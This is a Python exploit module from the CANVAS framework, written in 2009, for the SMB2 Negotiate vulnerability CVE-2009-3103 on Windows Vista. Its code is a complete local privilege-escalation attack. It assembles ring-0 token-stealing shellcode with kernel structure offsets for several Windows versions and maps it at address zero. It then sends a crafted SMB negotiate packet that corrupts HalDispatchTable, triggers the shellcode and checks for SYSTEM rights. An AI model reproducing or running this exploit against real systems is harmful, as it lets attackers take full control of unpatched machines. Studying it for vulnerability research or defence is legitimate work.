#!/usr/bin/env python
##ImmunityHeader v1 
###############################################################################
## File       :  smb2_negotiate.py
## Description:  
##            :  
## Created_On :  Wed Sep  9 14:15:38 2009
## Created_By :  Kostya Kortchinsky
## Modified_On:  Tue Sep 15 12:03:03 2009
## Modified_By:  Kostya Kortchinsky
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from ExploitTypes.localexploit import LocalExploit

# GUI info
NAME='SMB2 Negotiate Pointer Dereference Vulnerability'
DESCRIPTION='SMB2 Negotiate Pointer Dereference Vulnerability'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION['Date public']='09/07/09'
DOCUMENTATION['References']='http://blog.48bits.com/?p=510, http://www.microsoft.com/technet/security/Bulletin/MS09-050.mspx'
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2009-3103'
DOCUMENTATION['CVE Url']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103'
DOCUMENTATION['CVSS'] = 7.8

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Local'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['Vista']

NOTES="""
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',[0,0,0,0]],
    1: ['Windows Vista SP1',[0x3c,0xa8,0xc8,0x150]],
    2: ['Windows Vista SP2',[0x3c,0xac,0xcc,0x150]],
}

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.host=''
        self.port=445
        self.needsNoShellcode=1
        self.version=0

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
    
    def test(self):
        #XXX: Todo --Kostya
        return 1

    def CreateRing0Shellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called"""

        self.log('pid=%d, osmajor=%d, osminor=%d'%(pid,osmajor,osminor))
        ring0shellcode=""".byte 0x90
    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))
        
        if osmajor==6:
            self.log('Windows Vista & 2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003 SP0 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==3: #we set minor to 3 if 2003 SP1 or above
            self.log('Windows Server 2003 SP1-SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))
        self.shellcode=mosdef.assemble(ring0shellcode,'x86')
        print ring0shellcode #DEBUG

        return self.shellcode

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def memcpy(self, node, address, data):
        vars={}
        vars["address"] = address 
        vars["data"]    = data
        vars["size"]    = len(data)

        code="""
        //start of code
        #import "local","memcpy" as "memcpy"
        #import "int", "address" as "address"
        #import "int", "size" as "size"
        #import "string", "data" as "data"

        void main() 
        {
           memcpy(address, data, size);
        }
        """
        node.shell.clearfunctioncache()
        devlog("cparse", "MEMCPY Code: %s VARS: %s"%(code, vars))
        request=node.shell.compile(code,vars)
        node.shell.sendrequest(request)
        node.shell.leave()

            
    def usage(self):
        print 'Usage: %s -v version -t host -p port\n'%(sys.argv[0])
        self.displayVersions()

    def run_attack(self,node):
        self.node=node #XXX: not needed?
        ret,nodeos=node.shell.GetVersionEx()
        minor=nodeos['Minor Version']
        major=nodeos['Major Version']
        self.log('Attacking Windows %d.%d'%(major,minor))
        if major!=6 or minor!=0:
            self.log('This exploit is only for Windows Vista and 2008 Server')
            return 0
        if self.version==0:
            if nodeos['SP string']=='Service Pack 1':
                self.version=1
            elif nodeos['SP string']=='Service Pack 2':
                self.version=2
        if self.version==0:
            self.log('Unknown Vista Service Pack. Cannot continue.')
            return 0
        self.info,offsets=targets[self.version]
        pid=node.shell.getpid()
        self.CreateRing0Shellcode(pid,0x10,major,minor) #XXX: WTF
        ret,addresses=node.shell.EnumDeviceDrivers()
        if ret!=1:
            self.log('EnumDeviceDrivers failed. Cannot continue.')
            return 0
        found=False
        for imagebase in addresses:
            ret,basename=node.shell.GetDeviceDriverBaseName(imagebase)
            if ret!=0:
                found=basename.find(u'krnl'.encode('UTF-16LE'))!=-1 or basename.find(u'ntkr'.encode('UTF-16LE'))!=-1
                if found==True:
                    break
        if found!=True:
            self.log('NT kernel binary basename not found. Cannot continue.')
            return 0
        self.log('%s loaded at 0x%08x'%(basename,imagebase))
        handle=node.shell.LoadLibraryExW(basename+'\0\0') #widestring has to be 0 terminated!
        HalDispatchTable=node.shell.GetProcAddress(handle,'HalDispatchTable')
        HalDispatchTable=HalDispatchTable-handle+imagebase
        self.log('HalDispatchTable: 0x%08x'%(HalDispatchTable))

        shellcodeaddress=0
        ret=node.shell.NtAllocateVirtualMemory(shellcodeaddress)
        if ret!=0:
            self.log('NtAllocateVirtualMemory(0x%08x) failed!'%(shellcodeaddress))
            return 0
        self.log('NtAllocateVirtualMemory(0x%08x) succeeded!'%(shellcodeaddress))
        self.memcpy(node, shellcodeaddress,self.shellcode)

        s=self.gettcpsock(node)
        try:
            s.connect(('127.0.0.1',self.port))
        except:
            self.log('Could not connect to port %s'%(self.port))
            return 0

        pidhigh=(0x2d95c-0x2d270)/4 #index of a function with 4 arguments that doesn't return 0xc0000016
        packet=''
        packet+=struct.pack('<4sBLBHH8sHHHHH','\xffSMB',0x72,0x00000000,0x18,0xc803,pidhigh,'\0'*8,0x0000,0x0000,0x0000,0x0000,0x0000)
        dialects=''
        data=''
        data+='A'*(offsets[0]-0x2f-len(data))
        data+=struct.pack('<L',HalDispatchTable-0x18) #what to zero-out
        data+='A'*(offsets[1]-0x2f-len(data))
        data+=struct.pack('<L',0x00000000) #@0xa8==0
        data+='A'*(offsets[2]-0x2f-len(data))
        data+=struct.pack('<BBB',0x00,0x00,0x00) #@0xc8==0,@0xca==0
        data+='A'*(offsets[3]-0x2f-len(data))
        data+=struct.pack('<L',0x00000000) #index,something!=0
        data+='A'*(0x200-len(data))
        
        for d in ['SMB 2.002',data]:
                dialects+='\x02'+d +'\0'
        packet+=struct.pack('<BH',0x00,len(dialects))+dialects
        packet=struct.pack('>BBH',0x00,(len(packet)>>16)&0xff,(len(packet)&0xffff))+packet

        self.log('Sending the negotiate packet!')
        s.send(packet)
        try:
            s.recv(1024)
        except:
            pass
        s.close()
        self.log('Sleeping 5s')
        time.sleep(5)
        node.shell.NtQueryIntervalProfile(2) #ProfileTotalIssues
        whoami=self.exploitnodes('whoami',[node])[0]
        self.log('Currently running as: %s'%(whoami))
        if whoami[-1]=='$':
            self.log('Exploit succeeded!')
            self.setSucceeded()
            self.result=1
            return 1
        self.log('Exploit seem to have failed.')
        return 0

    def run(self):
        self.setInfo('%s (in progress)'%(NAME))
        success=0 
        for node in self.argsDict['passednodes']:
            if 'win32api' not in node.capabilities:
                self.log('Node %s not a Win32 node'%(node.getname()))
                continue
            ret=self.run_attack(node)
            if ret==1:
                success=1
        return success

if __name__=='__main__':
    print 'This win32 local module is meant to be run only within CANVAS'
"""
if __name__=='__main__':
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
"""
